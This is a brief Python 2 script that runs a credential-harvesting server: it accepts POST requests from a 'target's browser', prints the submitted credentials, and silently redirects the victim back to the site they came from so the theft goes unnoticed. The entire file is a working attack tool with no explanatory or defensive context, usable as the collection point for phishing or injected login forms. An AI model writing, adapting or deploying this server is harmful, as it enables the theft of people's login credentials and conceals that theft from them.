import SimpleHTTPServer
import SocketServer
import urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    # When the server receives a request from the target's browser
    def do_POST(self):
        # Read the Content-Length header to determine the size of the request
        content_length = int(self.headers['Content-Length'])
        # Read the Content of the request
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        # Parse out the originating site
        site = self.path[1:]
        self.send_response(301)
        # Force the target browser to redirect back to the main page of the target site
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()
        
server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
